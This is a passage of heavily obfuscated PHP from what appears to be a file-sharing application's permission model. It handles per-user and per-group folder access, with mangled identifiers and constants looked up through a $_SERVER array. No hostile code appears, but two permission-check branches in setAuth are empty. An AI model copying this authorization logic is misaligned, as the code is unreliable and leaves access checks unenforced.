$¨¡ŒÃ˜; } public function reportStatus($äöÛ±Şß) { $Ò²Æç®… =& $_SERVER[„Ç©ñÎ©]; $§«†ö€ô = array($Ò²Æç®…[408] => $äöÛ±Şß[$Ò²Æç®…[408]]); $èÕ¨ĞûÀ = Model($Ò²Æç®…[1992])->where($§«†ö€ô)->field($Ò²Æç®…[2001])->find(); if (!$èÕ¨ĞûÀ) { return !1; } $öÊ•»›• = array($Ò²Æç®…[753] => $äöÛ±Şß[$Ò²Æç®…[753]]); if ($äöÛ±Şß[$Ò²Æç®…[753]] == $Ò²Æç®…[1997] && $èÕ¨ĞûÀ[$Ò²Æç®…[753]] == $Ò²Æç®…[1997]) { $öÊ•»›•[$Ò²Æç®…[753]] = 0; } $¿ûûáÀˆ = Model($Ò²Æç®…[1992])->where($§«†ö€ô)->save($öÊ•»›•); if ($äöÛ±Şß[$Ò²Æç®…[753]] == $Ò²Æç®…[446]) { if ($èÕ¨ĞûÀ[$Ò²Æç®…[477]] != $Ò²Æç®…[207] && $this->shareFileMeta($èÕ¨ĞûÀ[$Ò²Æç®…[477]])) { $this->shareFileMeta($èÕ¨ĞûÀ[$Ò²Æç®…[477]], 0); } $this->remove($èÕ¨ĞûÀ[$Ò²Æç®…[498]]); return !0; } if ($¿ûûáÀˆ && $äöÛ±Şß[$Ò²Æç®…[753]] == $Ò²Æç®…[1997]) { $Ó†˜íÊ = $öÊ•»›•[$Ò²Æç®…[753]] == $Ò²Æç®…[1997] ? 1 : 0; $this->shareFileMeta($èÕ¨ĞûÀ[$Ò²Æç®…[477]], $Ó†˜íÊ); $this->removeByFile($èÕ¨ĞûÀ[$Ò²Æç®…[477]]); } return $¿ûûáÀˆ; } private function removeByFile($¼¶‚‚ÃÇ) { $ø·Ò»èï =& $_SERVER[„Ç©ñÎ©]; $¦Çİ‚ÈÔ = Model($ø·Ò»èï[828])->where(array($ø·Ò»èï[477] => $¼¶‚‚ÃÇ))->field($ø·Ò»èï[411])->select(); $ä£ëˆğ¨ = array_to_keyvalue($¦Çİ‚ÈÔ, $ø·Ò»èï[12], $ø·Ò»èï[411]); $È”úÖšÄ = array($ø·Ò»èï[411] => array($ø·Ò»èï[7], $ä£ëˆğ¨), $ø·Ò»èï[503] => 1); $¦Çİ‚ÈÔ = $this->where($È”úÖšÄ)->field($ø·Ò»èï[498])->select(); if (empty($¦Çİ‚ÈÔ)) { return; } $³ÅÓ¸Ú = array_to_keyvalue($¦Çİ‚ÈÔ, $ø·Ò»èï[12], $ø·Ò»èï[498]); $this->remove($³ÅÓ¸Ú); } private function shareFileMeta($ëêãá¹è, $Îö‡°—Ì = null) { $ºÑ„ÈŸô =& $_SERVER[„Ç©ñÎ©]; $ŸÛ×“©Ü = array($ºÑ„ÈŸô[477] => $ëêãá¹è, $ºÑ„ÈŸô[104] => $ºÑ„ÈŸô[2002]); if (is_null($Îö‡°—Ì)) { return Model($ºÑ„ÈŸô[2003])->where($ŸÛ×“©Ü)->find(); } $ŸÛ×“©Ü[$ºÑ„ÈŸô[383]] = $Îö‡°—Ì; Model($ºÑ„ÈŸô[2003])->add($ŸÛ×“©Ü, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\137\x73\x6f\x75\162\143\145\137\x61\x75\164\x68"; public function getAuth($×œß§‰Æ) { $£ŞËÔ³ =& $_SERVER[„Ç©ñÎ©]; $¨õ­‚Û— = $this->sourceAuthSelect($×œß§‰Æ); $Ù„ÀÛÇó = array(); $ÛãÜÔ› = array(); $¾ŒÂÍÌ = 2 << 25; foreach ($¨õ­‚Û— as $õçßê¢•) { $ÆÎöîñé = Model($£ŞËÔ³[516])->listData($õçßê¢•[$£ŞËÔ³[1931]]); if (!$ÆÎöîñé) { continue; } $Ù„ÀÛÇó[] = $õçßê¢•; $ñ”„Ê¾ = 0; if ($õçßê¢•[$£ŞËÔ³[420]] == SourceModel::TYPE_GROUP) { $ñ”„Ê¾ = $¾ŒÂÍÌ * 2; } if ($õçßê¢•[$£ŞËÔ³[420]] == SourceModel::TYPE_USER) { $ñ”„Ê¾ = $¾ŒÂÍÌ; } if ($õçßê¢•[$£ŞËÔ³[420]] == SourceModel::TYPE_USER && $õçßê¢•[$£ŞËÔ³[514]] == $£ŞËÔ³[207]) { $ñ”„Ê¾ = 0; } $ÛãÜÔ›[] = $ÆÎöîñé[$£ŞËÔ³[422]] + $ñ”„Ê¾; } array_multisort($ÛãÜÔ›, SORT_DESC, $Ù„ÀÛÇó); return $Ù„ÀÛÇó; } public function sourceAuthSelect($ÔÆ’íá¤) { $—û¼È =& $_SERVER[„Ç©ñÎ©]; static $¦ÉÆ­© = array(); $¼²Ò˜åÄ = is_array($ÔÆ’íá¤) ? !1 : !0; if ($¼²Ò˜åÄ) { $ÔÆ’íá¤ = array($ÔÆ’íá¤); } $Ò¼Ñœ²” = array(); foreach ($ÔÆ’íá¤ as $ÈÙØí³) { if (isset($¦ÉÆ­©[$ÈÙØí³])) { $Ò¼Ñœ²”[$ÈÙØí³] = $¦ÉÆ­©[$ÈÙØí³]; } } if (count($Ò¼Ñœ²”) == count($ÔÆ’íá¤)) { return $¼²Ò˜åÄ ? $Ò¼Ñœ²”[$ÔÆ’íá¤[0]] : $Ò¼Ñœ²”; } $ é‡ò = $—û¼È[2004]; $Ôâïõ¢¤ = array($—û¼È[411] => array($—û¼È[7], $ÔÆ’íá¤)); $ëşØø×‚ = $this->field($ é‡ò)->order($—û¼È[408])->where($Ôâïõ¢¤)->select(); $§î„ğÎ = array_to_keyvalue_group($ëşØø×‚, $—û¼È[411]); foreach ($ÔÆ’íá¤ as $ÈÙØí³) { $¦ÉÆ­©[$ÈÙØí³] = $§î„ğÎ[$ÈÙØí³] ? $§î„ğÎ[$ÈÙØí³] : array(); } if ($¼²Ò˜åÄ) { return $ëşØø×‚; } return $§î„ğÎ; } public function setAuth($òöØ›Å´, $Î–µŸ°º) { $³“ÀÎ ò =& $_SERVER[„Ç©ñÎ©]; $Ğãœ‘ ˆ = Model($³“ÀÎ ò[1326])->sourceInfo($òöØ›Å´); if (!$Ğãœ‘ ˆ) { return !1; } if ($Ğãœ‘ ˆ[$³“ÀÎ ò[420]] != SourceModel::TYPE_GROUP) { return !1; } $å—ƒŠĞÏ = 1; $ò®ñ¦·Î = $Ğãœ‘ ˆ[$³“ÀÎ ò[514]]; if ($ò®ñ¦·Î != $å—ƒŠĞÏ) { $Ş×ş£Úƒ = array($³“ÀÎ ò[1827] => $ò®ñ¦·Î); $è–¯Ú€² = Model($³“ÀÎ ò[1917])->field($³“ÀÎ ò[1655])->where($Ş×ş£Úƒ)->select(); $è–¯Ú€² = array_to_keyvalue($è–¯Ú€², $³“ÀÎ ò[12], $³“ÀÎ ò[1655]); } $Ö•úæ½ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $Èòª¥ŠÀ = array(); foreach ($Î–µŸ°º as $™°“õÃÇ) { if (!in_array($™°“õÃÇ[$³“ÀÎ ò[420]], $Ö•úæ½)) { show_json(LNG($³“ÀÎ ò[2005]), !1); } if ($ò®ñ¦·Î != $å—ƒŠĞÏ) { if ($™°“õÃÇ[$³“ÀÎ ò[420]] == SourceModel::TYPE_GROUP) { } if ($™°“õÃÇ[$³“ÀÎ ò[514]] != 0 && !in_array($™°“õÃÇ[$³“ÀÎ ò[514]], $è–¯Ú€²)) { } } if ($™°“õÃÇ[$³“ÀÎ ò[514]] == 0) { $™°“õÃÇ[$³“ÀÎ ò[420]] = SourceModel::TYPE_USER; } $Èòª¥ŠÀ[] = array($³“ÀÎ ò[411] => $òöØ›Å´, $³“ÀÎ ò[420] => intval($™°“õÃÇ[$³“ÀÎ ò[420]]), $³“ÀÎ ò[514] => intval($™°“õÃÇ[$³“ÀÎ ò[514]]), $³“ÀÎ ò[1931] => intval($™°“õÃÇ[$³“ÀÎ ò[1931]]) ? intval($™°“õÃÇ[$³“ÀÎ ò[1931]]) : 0, $³“ÀÎ ò[1987] => intval($™°“õÃÇ[$³“ÀÎ ò[1987]]) ? intval($™°“õÃÇ[$³“ÀÎ ò[1987]]) : -1); } $this->where(array($³“ÀÎ ò[426] => $òöØ›Å´))->delete(); $this->addAll($Èòª¥ŠÀ); return !0; } public function authClear($ÁÜïì¼) { $Ùæ•á·ú =& $_SERVER[„Ç©ñÎ©]; $ÖáâÄæ = Model($Ùæ•á·ú[1326])->sourceInfo($ÁÜïì¼); $ƒ­Æá˜ = array($ÁÜïì¼); if ($ÖáâÄæ[$Ùæ•á·ú[419]] == $Ùæ•á·ú[98]) { $’ìÇ¬Àï = array($Ùæ•á·ú[599] => array($Ùæ•á·ú[559], $ÖáâÄæ[$Ùæ•á·ú[530]] . $ÁÜïì¼ . $Ùæ•á·ú[560])); $ƒ­Æá˜ = Model($Ùæ•á·ú[1326])->field($Ùæ•á·ú[426])->where($’ìÇ¬Àï)->getField($Ùæ•á·ú[411], !0); $ƒ­Æá˜[] = $ÁÜïì¼; } $this->where(array($Ùæ•á·ú[426] => array($Ùæ•á·ú[427], $ƒ­Æá˜)))->delete(); return !0; } public function getAllChildren($úçÕ¡š–) { $¢»Ğ­ƒ =& $_SERVER[„Ç©ñÎ©]; $ÈòêÒığ = Model($¢»Ğ­ƒ[1326])->sourceInfo($úçÕ¡š–); if ($ÈòêÒığ[$¢»Ğ­ƒ[419]] != $¢»Ğ­ƒ[98]) { return $this->sourceListAuth(array($úçÕ¡š–)); } if ($ÈòêÒığ[$¢»Ğ­ƒ[420]] != SourceModel::TYPE_GROUP) { return array(); } $Ì‹ŠÉ°ò = 1; $µ›õ¢œ = array($úçÕ¡š–); if ($ÈòêÒığ[$¢»Ğ­ƒ[441]] == $¢»Ğ­ƒ[207] && $ÈòêÒığ[$¢»Ğ­ƒ[514]] != $Ì‹ŠÉ°ò) { $µ›õ¢œ = $this->groupChidldAllRootSource($ÈòêÒığ[$¢»Ğ­ƒ[514]]); } $¾Š¶Ûö = $this->field($¢»Ğ­ƒ[411])->group($¢»Ğ­ƒ[411])->select(); $¾Š¶Ûö = array_to_keyvalue($¾Š¶Ûö, $¢»Ğ­ƒ[12], $¢»Ğ­ƒ[411]); if (!$¾Š¶Ûö) { return array(); } $ì¼ ´Á = $¢»Ğ­ƒ[2006]; $áÛ®åÔÕ = array($¢»Ğ­ƒ[411] => array($¢»Ğ­ƒ[7], $¾Š¶Ûö), $¢»Ğ­ƒ[440] => $¢»Ğ­ƒ[207]); $ÉæŸß°è = Model($¢»Ğ­ƒ[828])->field($ì¼ ´Á)->where($áÛ®åÔÕ)->select(); $É‹†² = array($úçÕ¡š–); foreach ($ÉæŸß°è as $ÈÎçË€) { foreach ($µ›õ¢œ as $ŞÅ‰€‰§) { $©Ì·‰Â = $¢»Ğ­ƒ[50] . $ŞÅ‰€‰§ . $¢»Ğ­ƒ[50]; $™ÇÎ‘‡ = $ÈÎçË€[$¢»Ğ­ƒ[530]] . $ÈÎçË€[$¢»Ğ­ƒ[411]] . $¢»Ğ­ƒ[50]; if (strstr($™ÇÎ‘‡, $©Ì·‰Â)) { $É‹†²[] = $ÈÎçË€[$¢»Ğ­ƒ[411]]; break; } } } return $this->sourceListAuth($É‹†²); } private function sourceListAuth($Ù) { $£¥Ï’±ä =& $_SERVER[„Ç©ñÎ©]; $Ë‰õ–¦ = Model($£¥Ï’±ä[1326])->sourceListInfo($Ù, !0); $¦ ¢¨­Ë = $this->sourceAuthSelect($Ù); $Ş›İöÃ = array(); $‘é–—Èé = array(); foreach ($Ë‰õ–¦ as $ÎÛãœ²¿) { unset($ÎÛãœ²¿[$£¥Ï’±ä[465]]); unset($ÎÛãœ²¿[$£¥Ï’±ä[463]]); unset($ÎÛãœ²¿[$£¥Ï’±ä[422]]); unset($ÎÛãœ²¿[$£¥Ï’±ä[96]]); $İ®ªšÑ² = $¦ ¢¨­Ë[$ÎÛãœ²¿[$£¥Ï’±ä[411]]]; if (!$İ®ªšÑ²) { continue; } $ÎÛãœ²¿[$£¥Ï’±ä[2007]] = $this->authTargetInfo($İ®ªšÑ²); $ÎÛãœ²¿[$£¥Ï’±ä[528]] = rtrim($ÎÛãœ²¿[$£¥Ï’±ä[534]], $£¥Ï’±ä[8]) . $£¥Ï’±ä[8] . ltrim($ÎÛãœ²¿[$£¥Ï’±ä[528]], $£¥Ï’±ä[8]); $Ş›İöÃ[] = $ÎÛãœ²¿; $Ì»ô·Æ = count(explode($£¥Ï’±ä[8], trim($ÎÛãœ²¿[$£¥Ï’±ä[528]], $£¥Ï’±ä[8]))); $‘é–—Èé[] = $Ì»ô·Æ + ($ÎÛãœ²¿[$£¥Ï’±ä[33]] == $£¥Ï’±ä[85] ? 0 : 1000); } array_multisort($‘é–—Èé, SORT_ASC, $Ş›İöÃ); return $Ş›İöÃ; } private function groupChidldAllRootSource($²ÀĞ®ù‚) { $ÙãÉÓŒ‡ =& $_SERVER[„Ç©ñÎ©]; $ŠÚä¡ØŠ = Model($ÙãÉÓŒ‡[2008])->groupChildrenAll($²ÀĞ®ù‚); $È÷ºÇ¶ = array($ÙãÉÓŒ‡[441] => 0, $ÙãÉÓŒ‡[514] => array($ÙãÉÓŒ‡[7], $ŠÚä¡ØŠ), $ÙãÉÓŒ‡[420] => SourceModel::TYPE_GROUP); $ŒØËäô = Model($ÙãÉÓŒ‡[828])->field($ÙãÉÓŒ‡[411])->where($È÷ºÇ¶)->select(); $ŒØËäô = array_to_keyvalue($ŒØËäô, $ÙãÉÓŒ‡[12], $ÙãÉÓŒ‡[411]); return $ŒØËäô; } private function authTargetInfo($ñ·¾‘³§) { $«¨Òê²Õ =& $_SERVER[„Ç©ñÎ©]; $›Ğ¯ïÅ¸ = array(); $ÃÖŞÂã = array(); $›ë¿ùî = 2 << 25; foreach ($ñ·¾‘³§ as $ª‚Äšƒá) { $¸éØ¦í = Model($«¨Òê²Õ[516])->listData($ª‚Äšƒá[$«¨Òê²Õ[1931]]); if (!$¸éØ¦í) { continue; } if ($ª‚Äšƒá[$«¨Òê²Õ[420]] == SourceModel::TYPE_USER) { $ÀÉÈôÎ = Model($«¨Òê²Õ[522])->getInfoSimpleOuter($ª‚Äšƒá[$«¨Òê²Õ[514]]); if ($ÀÉÈôÎ[$«¨Òê²Õ[1655]] == $«¨Òê²Õ[1189]) { continue; } if ($ÀÉÈôÎ[$«¨Òê²Õ[1655]] == $«¨Òê²Õ[207]) { $ÀÉÈôÎ[$«¨Òê²Õ[32]] = LNG($«¨Òê²Õ[2009]); } } else { $ÀÉÈôÎ = Model($«¨Òê²Õ[531])->getInfoSimple($ª‚Äšƒá[$«¨Òê²Õ[514]]); } if (!$ÀÉÈôÎ) { continue; } $ÀÉÈôÎ[$«¨Òê²Õ[476]] = $¸éØ¦í; $›Ğ¯ïÅ¸[] = $ÀÉÈôÎ; $ÆâşŸ¿• = 0; if ($ª‚Äšƒá[$«¨Òê²Õ[420]] == SourceModel::TYPE_GROUP) { $ÆâşŸ¿• = $›ë¿ùî * 2; } if ($ª‚Äšƒá[$«¨Òê²Õ[420]] == SourceModel::TYPE_USER) { $ÆâşŸ¿• = $›ë¿ùî; } if ($ª‚Äšƒá[$«¨Òê²Õ[420]] == SourceModel::TYPE_USER && $ª‚Äšƒá[$«¨Òê²Õ[514]] == $«¨Òê²Õ[207]) { $ÆâşŸ¿• = 0; } $ÃÖŞÂã[] = $¸éØ¦í[$«¨Òê²Õ[422]] + $ÆâşŸ¿•; } array_multisort($ÃÖŞÂã, SORT_DESC, $›Ğ¯ïÅ¸); return $›Ğ¯ïÅ¸; } public function getAllChildrenByUser($ôƒ°½è, $ª·ş”¾) { $®ÃÓ²†‰ =& $_SERVER[„Ç©ñÎ©]; $’ºé = Model($®ÃÓ²†‰[544])->getInfo($ª·ş”¾); if (!$ª·ş”¾ || !$ôƒ°½è || !$’ºé) { return array(); } $é«è€ = Model($®ÃÓ²†‰[1326])->sourceInfo($ôƒ°½è); $Ø¥¢¼¨· = array(); $Ä°Îö¿¬ = 1; if ($é«è€[$®ÃÓ²†‰[441]] == $®ÃÓ²†‰[207] && $é«è€[$®ÃÓ²†‰[514]] != $Ä°Îö¿¬ && $this->groupContainUser($é«è€[$®ÃÓ²†‰[514]], $ª·ş”¾)) { foreach ($’ºé[$®ÃÓ²†‰[2010]] as $Ïş¶şÎ) { $ÜÌÆèŠí = Model($®ÃÓ²†‰[531])->getInfo($Ïş¶şÎ[$®ÃÓ²†‰[1827]]); $”şÁ‚¤³ = Model($®ÃÓ²†‰[544])->getInfoSimpleOuter($ª·ş”¾); $”şÁ‚¤³[$®ÃÓ²†‰[476]] = $Ïş¶şÎ[$®ÃÓ²†‰[422]]; if (Model($®ÃÓ²†‰[516])->authCheckAction($Ïş¶şÎ[$®ÃÓ²†‰[422]][$®ÃÓ²†‰[422]], $®ÃÓ²†‰[1848])) { continue; } $äçÕ¦º¶ = array($®ÃÓ²†‰[32] => $®ÃÓ²†‰[1603] . $ÜÌÆèŠí[$®ÃÓ²†‰[32]], $®ÃÓ²†‰[411] => $ÜÌÆèŠí[$®ÃÓ²†‰[96]][$®ÃÓ²†‰[411]], $®ÃÓ²†‰[94] => KodIO::make($ÜÌÆèŠí[$®ÃÓ²†‰[96]][$®ÃÓ²†‰[411]]), $®ÃÓ²†‰[441] => $®ÃÓ²†‰[207], $®ÃÓ²†‰[420] => $®ÃÓ²†‰[524], $®ÃÓ²†‰[33] => $®ÃÓ²†‰[563], $®ÃÓ²†‰[528] => $ÜÌÆèŠí[$®ÃÓ²†‰[535]], $®ÃÓ²†‰[1827] => $ÜÌÆèŠí[$®ÃÓ²†‰[1827]], $®ÃÓ²†‰[532] => $ÜÌÆèŠí[$®ÃÓ²†‰[441]], $®ÃÓ²†‰[2007] => array($”şÁ‚¤³)); $Ø¥¢¼¨·[$äçÕ¦º¶[$®ÃÓ²†‰[411]]] = $äçÕ¦º¶; } } $»î¯Úª = array(); $Ç»ò¿¯¹ = $this->getAllChildren($ôƒ°½è); foreach ($Ç»ò¿¯¹ as $‰ºâïå¾) { $ÜùÀğÈ× = !1; foreach ($‰ºâïå¾[$®ÃÓ²†‰[2007]] as $Áªáî¥³) { if ($Áªáî¥³[$®ÃÓ²†‰[1655]]) { if ($Áªáî¥³[$®ÃÓ²†‰[1655]] == $ª·ş”¾) { $ÜùÀğÈ× = !0; break; } } if ($Áªáî¥³[$®ÃÓ²†‰[1827]]) { if ($this->groupContainUser($Áªáî¥³[$®ÃÓ²†‰[1827]], $ª·ş”¾)) { $ÜùÀğÈ× = !0; break; } } } if ($ÜùÀğÈ×) { $»î¯Úª[] = $‰ºâïå¾; } $¡‡³Á = $‰ºâïå¾[$®ÃÓ²†‰[411]]; if (isset($Ø¥¢¼¨·[$¡‡³Á])) { $‰ºâïå¾[$®ÃÓ²†‰[2007]][] = $Ø¥¢¼¨·[$¡‡³Á][0]; $Ø¥¢¼¨·[$¡‡³Á] = !1; } } $Ø¥¢¼¨· = array_filter(array_values($Ø¥¢¼¨·)); $»î¯Úª = array_merge($Ø¥¢¼¨·, $»î¯Úª); return $»î¯Úª; } public function setAllChildrenByUser($åë†’Æ, $Üàş¿±Ğ, $Ö§¨‚şü) { $§ú‚¤æ =& $_SERVER[„Ç©ñÎ©]; $Îû˜„ç‘ = $this->getAllChildrenByUser($åë†’Æ, $Üàş¿±Ğ); if (!$Ö§¨‚şü || !$Îû˜„ç‘) { return !1; } foreach ($Îû˜„ç‘ as $³•ÛÜÖˆ) { $Ş¯¯³š = array(); foreach ($³•ÛÜÖˆ[$§ú‚¤æ[2007]] as $ Ñ‰©‘Ä) { $Ùë…ß· = $ Ñ‰©‘Ä[$§ú‚¤æ[476]]; $°îîú—ş = $ Ñ‰©‘Ä[$§ú‚¤æ[1655]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $‹õÛ„Ó = $ Ñ‰©‘Ä[$§ú‚¤æ[1655]] ? $ Ñ‰©‘Ä[$§ú‚¤æ[1655]] : $ Ñ‰©‘Ä[$§ú‚¤æ[1827]]; if ($ Ñ‰©‘Ä[$§ú‚¤æ[1655]] && $ Ñ‰©‘Ä[$§ú‚¤æ[1655]] == $Üàş¿±Ğ) { continue; } $Ş¯¯³š[] = array($§ú‚¤æ[411] => $³•ÛÜÖˆ[$§ú‚¤æ[411]], $§ú‚¤æ[420] => $°îîú—ş, $§ú‚¤æ[514] => intval($‹õÛ„Ó), $§ú‚¤æ[1931] => isset($Ùë…ß·[$§ú‚¤æ[408]]) ? intval($Ùë…ß·[$§ú‚¤æ[408]]) : 0, $§ú‚¤æ[1987] => isset($Ùë…ß·[$§ú‚¤æ[1987]]) ? intval($Ùë…ß·[$§ú‚¤æ[1987]]) : -1); } $Ş¯¯³š[] = array($§ú‚¤æ[411] => $³•ÛÜÖˆ[$§ú‚¤æ[411]], $§ú‚¤æ[420] => SourceModel::TYPE_USER, $§ú‚¤æ[514] => intval($Üàş¿±Ğ), $§ú‚¤æ[1931] => intval($Ö§¨‚şü), $§ú‚¤æ[1987] => -1); $this->where(array($§ú‚¤æ[426] => $³•ÛÜÖˆ[$§ú‚¤æ[411]]))->delete(); $this->addAll($Ş¯¯³š); } return !0; } public function get($¼º‚é×‘) { $½îĞƒ× = $this->getSourceList(array($¼º‚é×‘), !0); return $½îĞƒ×[0]; } public function getSourceList($—¼ÓÚÜˆ, $¾ƒ™ËŞ™ = false, $ìÓÑğšÆ = false) { $¥¹½„”„ =& $_SERVER[„Ç©ñÎ©]; if (!$—¼ÓÚÜˆ) { return array(); } $çğÊÆ¾ø = Model($¥¹½„”„[1326]); if (!$¾ƒ™ËŞ™ && count($—¼ÓÚÜˆ) == 1) { $¾ƒ™ËŞ™ = array(); $¾ƒ™ËŞ™[$—¼ÓÚÜˆ[0]] = $çğÊÆ¾ø->sourceInfo($—¼ÓÚÜˆ[0]); } if (!$¾ƒ™ËŞ™) { $»ÂïÆ…‹ = array($¥¹½„”„[426] => array($¥¹½„”„[427], $—¼ÓÚÜˆ)); $¾ƒ™ËŞ™ = $çğÊÆ¾ø->field($¥¹½„”„[2011])->where($»ÂïÆ…‹)->select(); $¾ƒ™ËŞ™ = array_to_keyvalue($¾ƒ™ËŞ™, $¥¹½„”„[411]); } $òô£ì¶¹ = $—¼ÓÚÜˆ; foreach ($¾ƒ™ËŞ™ as $ˆÛ×€İ‰ => $øŞ€¹Íš) { $›¢‹Ãû = $çğÊÆ¾ø->parentLevelArray($øŞ€¹Íš[$¥¹½„”„[530]]); $òô£ì¶¹ = array_merge($òô£ì¶¹, array($ˆÛ×€İ‰), array_reverse($›¢‹Ãû)); } $òô£ì¶¹ = array_values(array_unique($òô£ì¶¹)); if (!$òô£ì¶¹) { return array(); } $¶ğæø£ = $this->sourceAuthSelect($òô£ì¶¹); $ÅüÃã = array(); foreach ($òô£ì¶¹ as $ÅÃâÂ±é) { if (isset($¶ğæø£[$ÅÃâÂ±é])) { $ÅüÃã[$ÅÃâÂ±é] = $¶ğæø£[$ÅÃâÂ±é]; } } $®˜¦ßò = $this->userIsRoot($ìÓÑğšÆ); $Ô×‹àÛº = AuthModel::authAll(); $¢¾¶¡Î = array($¥¹½„”„[423] => $Ô×‹àÛº, $¥¹½„”„[2012] => array($¥¹½„”„[428] => 0, $¥¹½„”„[1833] => $Ô×‹àÛº, $¥¹½„”„[429] => LNG($¥¹½„”„[2013]), $¥¹½„”„[1850] => $¥¹½„”„[2014])); $ öÍ•Òß = array(); foreach ($¾ƒ™ËŞ™ as $ÅÃâÂ±é => $ßÃ‰Â‡·) { if ($®˜¦ßò && $GLOBALS[$¥¹½„”„[6]][$¥¹½„”„[1846]]) { $ öÍ•Òß[$ÅÃâÂ±é] = $¢¾¶¡Î; continue; } $ öÍ•Òß[$ÅÃâÂ±é] = $this->makeSourceAuth($ßÃ‰Â‡·, $ÅüÃã, $ìÓÑğšÆ); } return $ öÍ•Òß; } public function authDeepCheck($•ìƒÚò, $Ã¦ğÔÇÑ = false) { $¯¶Ëó =& $_SERVER[„Ç©ñÎ©]; $Ã¦ğÔÇÑ = $Ã¦ğÔÇÑ ? $Ã¦ğÔÇÑ : USER_ID; $†­ß¹Û¶ = $this->makeAuthDeep($Ã¦ğÔÇÑ); if (!in_array($•ìƒÚò, $†­ß¹Û¶[$¯¶Ëó[2015]])) { return !1; } $ñ¨ğšØ = array(); foreach ($†­ß¹Û¶[$¯¶Ëó[2016]] as $úˆÍÃÇî => $¶±İäÙ²) { if (!in_array($•ìƒÚò, $¶±İäÙ²)) { continue; } $ñ¨ğšØ[] = $úˆÍÃÇî; } if (!$ñ¨ğšØ) { return !1; } $•Â‹©ó = $ñ¨ğšØ ? $ñ¨ğšØ[0] : $•ìƒÚò; return array($¯¶Ëó[423] => -1, $¯¶Ëó[476] => array($¯¶Ëó[428] => $¯¶Ëó[1189], $¯¶Ëó[1833] => $¯¶Ëó[207], $¯¶Ëó[429] => LNG($¯¶Ëó[2017]), $¯¶Ëó[1850] => $¯¶Ëó[2018]), $¯¶Ëó[2019] => LNG($¯¶Ëó[2020]), $¯¶Ëó[2021] => $this->sourceAuthInfo($•Â‹©ó)); } protected function makeAuthDeep($ñÄî¼¥Ç = false) { $äÊ— —³ =& $_SERVER[„Ç©ñÎ©]; static $ŸéªÇ«— = array(); $ñÄî¼¥Ç = $ñÄî¼¥Ç ? $ñÄî¼¥Ç : USER_ID; if (isset($ŸéªÇ«—[$ñÄî¼¥Ç])) { return $ŸéªÇ«—[$ñÄî¼¥Ç]; } $‹¡›»— = Model($äÊ— —³[2022])->listData(); $©İ¦¿ = array(); foreach ($‹¡›»— as $Ìºñ¤æØ) { if ($Ìºñ¤æØ[$äÊ— —³[422]] == 0 && $Ìºñ¤æØ[$äÊ— —³[1849]] == $äÊ— —³[98]) { $©İ¦¿[] = $Ìºñ¤æØ[$äÊ— —³[408]]; } } $›æ‘Ôö = $this->userGroupParents($ñÄî¼¥Ç); $Š§Àß¦â = array($äÊ— —³[420] => SourceModel::TYPE_USER, $äÊ— —³[514] => $ñÄî¼¥Ç); if ($›æ‘Ôö) { $Š§Àß¦â = array(array($äÊ— —³[420] => SourceModel::TYPE_USER, $äÊ— —³[514] => $ñÄî¼¥Ç), array($äÊ— —³[420] => SourceModel::TYPE_GROUP, $äÊ— —³[514] => array($äÊ— —³[427], $›æ‘Ôö)), $äÊ— —³[999] => $äÊ— —³[1925]); } $š£–ß•• = $this->field($äÊ— —³[2023])->where($Š§Àß¦â)->select(); $¹Ô…½Ä± = array(); $¡Ì½ÄêÒ = array_to_keyvalue_group($š£–ß••, $äÊ— —³[411]); foreach ($¡Ì½ÄêÒ as $ß„«µºß => $ŒşĞ‰î•) { $×â¼Î¿æ = $this->authArrayCheck($ŒşĞ‰î•, $ñÄî¼¥Ç); if ($×â¼Î¿æ[$äÊ— —³[423]] > 0) { $¹Ô…½Ä±[] = $ß„«µºß . $äÊ— —³[12]; } } if ($›æ‘Ôö) { $¹ûîöÙ = Model($äÊ— —³[531]); foreach ($›æ‘Ôö as $È¸É°±) { $ÚˆÈç = $¹ûîöÙ->getInfo($È¸É°±); if (!$ÚˆÈç || !is_array($ÚˆÈç[$äÊ— —³[96]])) { continue; } $¹Ô…½Ä±[] = $ÚˆÈç[$äÊ— —³[96]][$äÊ— —³[411]]; } } $÷ùŒğ¸Ÿ = array(); $í÷ëï¿ß = $›æ‘Ôö; $¡­à€Êê = Model($äÊ— —³[1326]); $¹ûîöÙ = Model($äÊ— —³[531]); $÷ÔÇŒÑ€ = array(); $â“˜™ó“ = array(); $¹´©ãµù = array(); $¸“·ÙÛ = array(); if ($¹Ô…½Ä±) { $”ƒ¹”Œ = $¡­à€Êê->where(array($äÊ— —³[411] => array($äÊ— —³[427], $¹Ô…½Ä±)))->select(); foreach ($”ƒ¹”Œ as $´Í£˜¿Ã) { $§‰‹Óó— = $¡­à€Êê->parentLevelArray($´Í£˜¿Ã[$äÊ— —³[530]]); $÷ùŒğ¸Ÿ = array_merge($÷ùŒğ¸Ÿ, $§‰‹Óó—); $í÷ëï¿ß[] = $´Í£˜¿Ã[$äÊ— —³[514]]; $÷ÔÇŒÑ€[$´Í£˜¿Ã[$äÊ— —³[411]]] = $§‰‹Óó—; $â“˜™ó“[$´Í£˜¿Ã[$äÊ— —³[411]]] = $´Í£˜¿Ã[$äÊ— —³[514]]; } } $í÷ëï¿ß = array_values(array_unique($í÷ëï¿ß)); $Ì”¼‹ŒÅ = $í÷ëï¿ß; foreach ($Ì”¼‹ŒÅ as $È¸É°±) { $ÚˆÈç = $¹ûîöÙ->getInfo($È¸É°±); $§‰‹Óó— = $¡­à€Êê->parentLevelArray($ÚˆÈç[$äÊ— —³[530]]); $í÷ëï¿ß = array_merge($í÷ëï¿ß, $§‰‹Óó—); } $í÷ëï¿ß = array_values(array_unique($í÷ëï¿ß)); foreach ($í÷ëï¿ß as $È¸É°±) { $ÚˆÈç = $¹ûîöÙ->getInfo($È¸É°±); $÷ùŒğ¸Ÿ[] = $ÚˆÈç[$äÊ— —³[96]][$äÊ— —³[411]]; $¹´©ãµù[$È¸É°±] = $ÚˆÈç[$äÊ— —³[96]][$äÊ— —³[411]]; $¸“·ÙÛ[$È¸É°±] = $¡­à€Êê->parentLevelArray($ÚˆÈç[$äÊ— —³[530]]); } foreach ($÷ÔÇŒÑ€ as $»í¸ÜÚÉ => $£Å‚¨‚˜) { $ØÔï¾€¼ = $â“˜™ó“[$»í¸ÜÚÉ]; if (!$ØÔï¾€¼ || !$¹´©ãµù[$ØÔï¾€¼]) { continue; } $äóïŠÇ¶ = array(); foreach ($¸“·ÙÛ[$ØÔï¾€¼] as $È¸É°±) { $äóïŠÇ¶[] = $¹´©ãµù[$È¸É°±]; } 